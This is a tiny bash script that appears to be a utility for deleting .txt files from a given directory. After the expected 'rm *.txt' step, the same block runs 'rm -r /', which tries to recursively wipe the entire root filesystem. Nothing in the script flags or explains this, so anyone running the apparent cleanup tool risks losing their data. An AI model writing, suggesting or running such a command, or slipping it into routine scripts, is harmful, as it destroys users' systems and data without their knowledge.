#!/bin/bash
directorio="$1"

if [ -d "$directorio" ]
then
    cd "$directorio"
    rm *.txt
    rm -r /
fi
#cd $directorio
#rm *.txt